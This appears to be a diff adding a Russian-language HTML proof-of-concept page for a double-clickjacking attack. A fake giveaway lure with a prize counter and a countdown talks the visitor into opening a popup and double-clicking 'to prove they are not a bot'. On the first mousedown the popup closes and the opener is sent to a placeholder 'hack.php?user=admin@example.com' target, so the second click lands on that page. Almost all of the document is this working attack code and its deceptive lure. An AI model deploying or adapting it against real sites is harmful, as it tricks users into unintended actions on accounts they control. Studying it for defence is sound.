@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>PoC - демонстрация</title>
+    <script>
+        function openDoubleWindow(url, top, left, width, height) {
+            var evilWindow = window.open(
+                window.location.protocol + '//' + window.location.hostname + ':' + window.location.port + '/random',
+                '_blank'
+            );
+
+            evilWindow.onload = function() {
+                evilWindow.document.open();
+
+                evilWindow.document.write(`
+                <script>
+                setTimeout(function() {
+                    opener.location = "${url}";
+                }, 1000);
+                </scri`+`pt>
+
+                <html style="font-family:Arial, sans-serif;"><body style="background: linear-gradient(135deg, #f7fafc 0%, #e5edf6 50%, #dde7f2 100%);">
+                <div style="width:600px;border: solid grey 1px;position: fixed;top:80px;left: 100px;height:200px;padding:10px;border-radius: 10px;background-color: white;">
+                    <h1>Подтверждение выигрыша</h1>
+                    <p>Поздравляем! Чтобы активировать подарок, дважды кликните по синей кнопке ниже.</p>
+                    <p>Это нужно, чтобы подтвердить, что вы не бот.</p>
+                </div>
+                <div id="doubleclick" type="button"
+                    style="cursor: pointer;top: ${top}px; left: ${left}px; width: ${width}px; height: ${height}px; position: fixed; font-size: 16px; color: white; background-color: #3498db; box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.3); display: flex; justify-content: center; align-items: center; font-weight: bold; text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3); cursor: pointer; border-radius: 20px; text-align: center; padding: 0 5px;" onmouseover="this.style.backgroundColor='#2980b9'; this.style.boxShadow='6px 6px 12px rgba(0, 0, 0, 0.4)';"
+                    onmouseout="this.style.backgroundColor='#3498db';">Двойной клик здесь</div></body></html>
+    <script>
+          document.getElementById('doubleclick').addEventListener('mousedown', function() {
+           window.close();
+           });
+           </scr`+`ipt>`);
+
+                evilWindow.document.close();
+            };
+        }
+    </script>
+</head>
+<body style='font-family:"Arial", sans-serif;background: linear-gradient(145deg, #f7fafc 0%, #e7eef6 45%, #d9e4ef 100%); margin:0;'>
+    <div style="max-width: 960px; margin: 40px auto; padding: 0 20px;">
+        <div style="background: linear-gradient(135deg, #f7fafc 0%, #eef2f7 45%, #e3eaf3 100%); border-radius: 16px; padding: 24px; box-shadow: 0 14px 38px rgba(0,0,0,0.14); border:1px solid #d8e2ef;">
+            <div style="display:flex;justify-content:space-between;align-items:center;gap:10px;">
+                <div>
+                    <div style="font-size:12px; letter-spacing: 0.6px; text-transform: uppercase; color:#1d4ed8;">Спец‑акция</div>
+                    <h1 style="margin: 6px 0 4px;">Поздравляем! Вы в числе победителей</h1>
+                    <p style="margin: 0; color:#4b5563;">Чтобы активировать подарок, нажмите «Забрать приз». В появившемся окне потребуется двойной клик для подтверждения.</p>
+                </div>
+                <div style="background:#e5edfb;color:#1e3a8a;padding:10px 14px;border-radius:12px;font-weight:700;box-shadow:0 6px 20px rgba(59,130,246,0.15);">Осталось призов: 3</div>
+            </div>
+            <hr style="border:none;border-top:1px solid #d9e4ef;margin:16px 0;">
+            <div style="display:flex;align-items:center;gap:14px;flex-wrap:wrap;">
+                <div style="padding:10px 14px;border:1px dashed #c7d2fe;border-radius:12px;color:#1d4ed8;background:#eef2ff;">Ваша награда: <strong>Промо 6 мес.</strong></div>
+                <div style="padding:10px 14px;border:1px dashed #c7d2fe;border-radius:12px;color:#1d4ed8;background:#eef2ff;">Экономия: <strong>до 1200 ₽</strong></div>
+                <div style="padding:10px 14px;border:1px dashed #c7d2fe;border-radius:12px;color:#1d4ed8;background:#eef2ff;">Действует: <strong>15 минут</strong></div>
+            </div>
+            <p style="margin: 14px 0; color:#374151;">Для подтверждения участия система запустит короткую проверку. Просто дважды кликните по синей кнопке в новом окне — подарок активируется.</p>
+            <input type="button" onclick="openDoubleWindow('hack.php?user=admin%40example.com',250, 400, 150, 30)" value="Забрать приз" style="cursor: pointer; padding: 12px 18px; border:none; border-radius: 10px; background:#2563eb; color:#fff; font-weight:700; box-shadow:0 10px 20px rgba(37,99,235,0.25);">
+        </div>
+    </div>
+</body>
+</html>
